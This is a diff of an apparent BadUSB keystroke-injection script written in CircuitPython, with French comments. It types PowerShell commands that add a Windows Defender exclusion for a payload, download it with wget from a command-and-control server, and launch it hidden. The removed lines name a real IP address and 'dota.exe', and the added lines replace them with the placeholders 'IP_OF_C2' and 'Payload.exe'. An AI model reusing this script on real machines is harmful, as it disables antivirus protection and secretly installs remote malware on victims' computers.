@@ -56,7 +56,7 @@ kbd.press(Keycode.ENTER)
 kbd.release_all()
 time.sleep(0.5)
 
-layout.write('Add-MpPreference -ExclusionProcess "dota.exe"')
+layout.write('Add-MpPreference -ExclusionProcess "Payload.exe"')
 kbd.press(Keycode.ENTER)
 kbd.release_all()
 time.sleep(0.5)
@@ -67,13 +67,13 @@ kbd.release_all()
 time.sleep(1)
 
 # Télécharger le payload
-layout.write("wget http://51.38.235.182:1234/dota.exe -O dota.exe")
+layout.write("wget http://IP_OF_C2/Payload.exe -O Payload.exe")
 kbd.press(Keycode.ENTER)
 kbd.release_all()
-time.sleep(1)  # Augmenté pour le téléchargement
+time.sleep(1)  
 
 # Lancer le payload
-layout.write('Start-Process "C:\\games\\dota.exe" -WindowStyle Hidden')
+layout.write('Start-Process "C:\\games\\Payload.exe" -WindowStyle Hidden')
 kbd.press(Keycode.ENTER)
 kbd.release_all()
 time.sleep(1)
